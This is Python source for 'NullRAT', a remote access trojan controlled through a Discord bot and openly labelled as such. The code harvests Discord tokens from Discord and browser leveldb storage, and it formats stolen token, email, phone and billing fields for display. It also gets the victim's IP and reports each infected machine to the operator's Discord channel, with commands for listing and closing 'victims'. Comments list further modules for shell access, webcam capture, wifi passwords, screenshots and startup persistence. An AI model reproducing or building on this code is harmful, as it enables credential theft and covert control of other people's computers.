from Variables import *

import disnake as discord
from disnake import Embed
from disnake.ext import commands

from datetime import datetime
from socket import create_connection
import os, re, aiohttp, requests, random

###################################################################
def IP():
    try: return requests.get("http://icanhazip.com/").text.rstrip()
    except: return "127.0.0.1"

def genEmbed(self, title, timestamp, description=None):
    if description is None:
        embed = discord.Embed(
            title=title, 
            timestamp=timestamp
        )
    else:
        embed = discord.Embed(
            title=title, 
            description=description,
            timestamp=timestamp
        )
    embed.set_footer( text="NullRAT" )
    return embed
        
def checked_embeds(self, tk, em, ph, un, ni, bi, av, idqa):
    embed=discord.Embed(title="Token Info:")
    embed.set_author(name="NullCode1337", url="https://github.com/NullCode1337")
    embed.set_thumbnail(url=av)
    embed.add_field(name="Token", value=f"```{tk}```", inline=False)
    embed.add_field(name="Username", value=un, inline=True)
    embed.add_field(name="Nitro", value=ni, inline=True)
    embed.add_field(name="Billing Info", value=bi, inline=True)
    embed.add_field(name="ID", value=idqa, inline=True)
    embed.add_field(name="Phone Number", value=ph, inline=True)
    embed.add_field(name="Email", value=em, inline=False)
    return embed

def find_token(self):
    tokens = tokens2 = []
    local, roaming = os.getenv("LOCALAPPDATA"), os.getenv("APPDATA")
    paths = {
        "Lightcord": roaming + "\\Lightcord",
        "Opera": roaming + "\\Opera Software\\Opera Stable",             "Opera GX": roaming + "\\Opera Software\\Opera GX Stable",
        "Chrome": local + "\\Google\\Chrome\\User Data\\Default",        "Brave": local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
        "Yandex": local + "\\Yandex\\YandexBrowser\\User Data\\Default", "Vivaldi": local + "\\Vivaldi\\User Data\\Default",
        "MSEdge": local + "\\Microsoft\\Edge\\User Data\\Default",       "Chromium": local + "\\Chromium\\User Data\\Default"
    }
    for platform, path in paths.items():
        path += '\\Local Storage\\leveldb'
        try: 
            for file_name in os.listdir(path):
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'): 
                    continue
                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}', r'mfa\.[\w-]{84}'):
                        for token in re.findall(regex, line): 
                            tokens.append(token)
        except FileNotFoundError: continue
    def englishOnly(s): 
        return s.isascii()
    goodTKs = []
    for t in tokens:
        if englishOnly(t): goodTKs.append(t)
    return goodTKs
###################################################################

original_dir = os.getcwd()

class NullBot(commands.InteractionBot):
    def __init__(self, **options):
        super().__init__(**options)
        self.ip_addr = IP()
        self.original_dir = original_dir
        if "dmin" in os.getenv("username"):
            self.identifier = self.ip_addr
        else:
            self.identifier = os.getenv("username") 
    
    genEmbed = genEmbed
    checked_embeds = checked_embeds
    find_token = find_token
        
client = NullBot(test_guilds=server_ids)
nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"

if os.path.isdir(nr_working) != True:
    os.mkdir(nr_working)
    
###################################################################
    
@client.event
async def on_ready():
    embed = Embed(
        title = f"NullRAT **IX** started on: **{client.identifier}**", 
        description = f"Currently present in:\n```{client.original_dir}```",
        timestamp = datetime.now()
    ).set_author(
        name="NullCode1337", 
        url=r"http://null337.rf.gd/", 
        icon_url=r"https://cdn.discordapp.com/attachments/959480539335766036/984699113734037544/embed_pfp2.png"
    ).set_footer(
        text = f"Startup time:"
    )
    await client.get_channel(notification_channel).send(embed=embed)    

############### Basic commands 

@client.slash_command()
async def listvictims(ctx):
    """Lists all victim identifiers accessible by NullRAT"""
    await ctx.channel.send( 
        embed=discord.Embed(title=f"The identifier for {os.getenv('username')} is: {client.identifier}") 
    )
    await ctx.response.send_message("__Checked all available victims:__")

@client.slash_command()
async def close(ctx, victim):
    """Shuts down a specific instance of NullRAT.
    
    Parameters
    ----------
    victim: Identifier of the affected computer (found via /listvictims)
    """
    if str(victim) == str(identifier):
        await ctx.response.send_message(
            embed = client.genEmbed(
                "Closing NullRAT for machine " + identifier,
                datetime.now()
            )
        )
        await client.close()
        
@client.slash_command(description="Quits all instances of NullRAT")
async def close_all(ctx):
    """Shuts down all instances of NullRAT"""
    await ctx.response.send_message("Are you sure?", view=closeall_confirm())
    
############### Closing class 

class closeall_confirm(discord.ui.View):
    @discord.ui.button(label="Yes", style=discord.ButtonStyle.danger)
    async def first_button_callback(self, button, interaction):
        for child in self.children:
            child.disabled = True
        await interaction.response.edit_message(view=self) 
        await interaction.channel.send(embed=Embed(title="Shutting down all instances of NullRAT...")) 
        await client.close()
        
    @discord.ui.button(label="No", style=discord.ButtonStyle.primary)
    async def second_button_callback(self, button, interaction):
        for child in self.children:
            child.disabled = True
        await interaction.response.edit_message(view=self) 
        await interaction.channel.send(embed=Embed(title="Aborted shut-down"))   
        
############### Bot Extensions

# extensions = (
    # "Aa"
# )
client.load_extension("modules."+"receivefiles")

# for ex in extensions:
    # client.load_extension("modules."+"receivefiles")

############### Bot Startup
def is_connected():
    try: create_connection(("1.1.1.1", 53)); return True
    except OSError: return False
    
while is_connected() == False: 0
client.run(bot_token)
############### Bot Startup

    # "hide",           # /hidefile & /unhidefile
    # "wifi",           # /wifilist & /wifipass
    # "shell",          # /cmd & /powershell
    # "getenv",         # /get_environment
    # "webcam",         # /get_webcam
    # "startup",        # /startup
    # "geolocate",      # /get_geolocation
    # "directory",      # /get_currentdir & /change_directory & /list_directory
    # "rawtokens",      # /raw_tokens & /raw_discord
    # "sendfiles",      # /sendfiles
    # "systeminfo",     # /get_systeminfo
    # "screenshot",     # /get_screenshot
    # "receivefiles",   # /receivefiles
    # "checkedtokens"   # /checked_tokens & /checked_discord